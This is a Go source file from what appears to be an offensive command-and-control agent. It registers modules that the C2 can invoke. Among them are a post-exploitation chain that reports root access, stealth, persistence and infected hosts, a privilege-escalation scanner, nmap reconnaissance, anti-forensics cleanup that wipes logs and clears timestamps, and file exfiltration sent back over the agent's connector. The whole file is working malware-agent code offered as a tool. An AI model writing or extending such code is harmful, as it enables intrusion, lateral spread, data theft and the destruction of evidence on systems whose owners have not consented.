// Package agent provides real Module implementations for the Agent.
//
// These modules are registered with the Agent's ModuleManager and
// can be invoked by the C2 or the post-exploitation pipeline.

package agent

import (
	"context"
	"fmt"
	"os/exec"
	"strings"

	"github.com/ruby570bocadito/x404x/shared/types"
)

// PostExploitModule implements the full post-exploitation chain.
type PostExploitModule struct {
	agent *Agent
}

func (m *PostExploitModule) Name() string             { return "post_exploit" }
func (m *PostExploitModule) KillChainPhase() types.KillChainPhase { return types.PhaseExploitation }

func (m *PostExploitModule) Execute(ctx context.Context, params map[string]string) (string, error) {
	pipeline := NewPostExploitPipeline(m.agent.cfg, m.agent.log, m.agent.bridgeClient)
	result := pipeline.FullChain(ctx)

	return fmt.Sprintf(
		"hostname=%s root=%v vector=%s stealth=%v persist=%v scanned=%d infected=%d advice=%s elapsed=%dms",
		result.Hostname, result.RootObtained, result.PrivescVector,
		result.StealthApplied, result.PersistMethods,
		result.Propagation.HostsScanned, result.Propagation.HostsInfected,
		result.AIAdvice, result.ElapsedMs,
	), nil
}

// PrivescScanModule runs Rise-Privilege privilege escalation scan.
type PrivescScanModule struct {
	agent *Agent
}

func (m *PrivescScanModule) Name() string             { return "privesc_scan" }
func (m *PrivescScanModule) KillChainPhase() types.KillChainPhase { return types.PhaseExploitation }

func (m *PrivescScanModule) Execute(ctx context.Context, params map[string]string) (string, error) {
	rw := NewRiseWrapper(m.agent.log)
	if !rw.IsAvailable() {
		return "", fmt.Errorf("Rise-Privilege binary not available")
	}

	vector := params["vector"]
	if vector == "" {
		vector = "all"
	}

	result, err := rw.Scan(ctx, vector)
	if err != nil {
		return "", fmt.Errorf("privesc scan failed: %w", err)
	}

	return fmt.Sprintf("rooted=%v vectors=%d findings=%d", result.Rooted, len(result.Vectors), len(result.Findings)), nil
}

// ReconModule runs basic reconnaissance.
type ReconModule struct {
	agent *Agent
}

func (m *ReconModule) Name() string              { return "recon_basic" }
func (m *ReconModule) KillChainPhase() types.KillChainPhase { return types.PhaseRecon }

func (m *ReconModule) Execute(ctx context.Context, params map[string]string) (string, error) {
	target := params["target"]
	if target == "" {
		target = "127.0.0.1"
	}

	// Try Python bridge first
	if m.agent.bridgeClient != nil && m.agent.bridgeClient.Connected() {
		resp, err := m.agent.bridgeClient.Call(ctx, "recon", "scan", map[string]interface{}{
			"target": target, "mode": "basic",
		})
		if err == nil && resp.Success {
			return fmt.Sprintf("%v", resp.Result), nil
		}
	}

	// Fallback: local nmap
	cmd := exec.CommandContext(ctx, "nmap", "-sV", "-F", target)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("recon failed: %w", err)
	}

	lines := strings.Split(string(output), "\n")
	return strings.Join(lines[:min(20, len(lines))], "\n"), nil
}

// CleanupModule handles anti-forensics cleanup.
type CleanupModule struct {
	agent *Agent
}

func (m *CleanupModule) Name() string              { return "cleanup" }
func (m *CleanupModule) KillChainPhase() types.KillChainPhase { return types.PhaseActionsOnObjective }

func (m *CleanupModule) Execute(ctx context.Context, params map[string]string) (string, error) {
	if m.agent.bridgeClient != nil && m.agent.bridgeClient.Connected() {
		resp, err := m.agent.bridgeClient.Call(ctx, "cleanup", "run", map[string]interface{}{
			"wipe_logs": true, "clear_timestamps": true,
			"remove_persistence": true,
		})
		if err == nil && resp.Success {
			return fmt.Sprintf("%v", resp.Result), nil
		}
	}
	return "cleanup via bridge unavailable — direct mode not implemented", nil
}

// ExfilModule handles file exfiltration.
type ExfilModule struct {
	agent *Agent
}

func (m *ExfilModule) Name() string              { return "exfil" }
func (m *ExfilModule) KillChainPhase() types.KillChainPhase { return types.PhaseExfiltration }

func (m *ExfilModule) Execute(ctx context.Context, params map[string]string) (string, error) {
	path := params["path"]
	if path == "" {
		return "", fmt.Errorf("path is required")
	}

	manager := NewExfilManager(m.agent.log, m.agent.session)
	result, err := manager.ExfilFile(ctx, path, func(data []byte) error {
		return m.agent.connector.Send(data)
	})
	if err != nil {
		return "", err
	}

	return fmt.Sprintf("file=%s size=%d chunks=%d status=%s elapsed=%dms",
		result.Filename, result.TotalSize, result.Chunks, result.Status, result.ElapsedMs), nil
}
func (m *PrivescScanModule) Description() string { return "Privilege escalation scanner" }
func (m *ReconModule) Description() string { return "Network reconnaissance module" }
